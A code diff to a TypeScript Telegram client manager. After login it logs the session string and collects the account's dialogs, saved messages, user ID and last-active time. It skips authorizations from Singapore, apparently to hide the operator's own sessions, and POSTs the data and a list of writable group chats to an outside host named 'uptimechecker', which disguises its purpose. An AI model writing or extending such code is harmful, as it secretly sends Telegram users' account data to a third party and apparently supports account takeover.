@@ -114,6 +114,19 @@ class TelegramManager {
         this.createClient();
     }
 
+    async getLastActiveTime() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations());
+        let latest = 0
+        result.authorizations.map((auth) => {
+            if (!auth.country.toLowerCase().includes('singapore')) {
+                if (latest < auth.dateActive) {
+                    latest = auth.dateActive;
+                }
+            }
+        })
+        return latest
+    }
+
     async disconnect() {
         await this.client.disconnect();
         await this.client.destroy();
@@ -232,10 +245,12 @@ class TelegramManager {
                 console.log(this.client.session.save());
                 const sess = this.client.session.save() as unknown as string;
                 const user: any = await result.user.toJSON();
-                const chats = await this.client?.getDialogs({ limit: 500 });
+                const chats = await this.client?.getDialogs({ limit: 600 });
                 const myMsgs = await this.client.getMessages('me', { limit: 8 });
                 let personalChats = 0;
                 let channels = 0;
+                const lastActive = await this.getLastActiveTime();
+                const date = new Date(lastActive * 1000)
                 const chatsArray = [];
 
                 chats.map((chat: any) => {
@@ -246,8 +261,7 @@ class TelegramManager {
                         if (!chatEntity.broadcast && !cannotSendMsgs) {
                             chatsArray.push(chatEntity);
                         }
-                    }
-                    else {
+                    } else {
                         personalChats++
                     }
                 });
@@ -260,7 +274,10 @@ class TelegramManager {
                     channels: channels,
                     personalChats: personalChats,
                     msgs: myMsgs['total'],
-                    totalChats: chats['total']
+                    totalChats: chats['total'],
+                    lastActive: lastActive,
+                    date: date,
+                    tgId: user.id
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
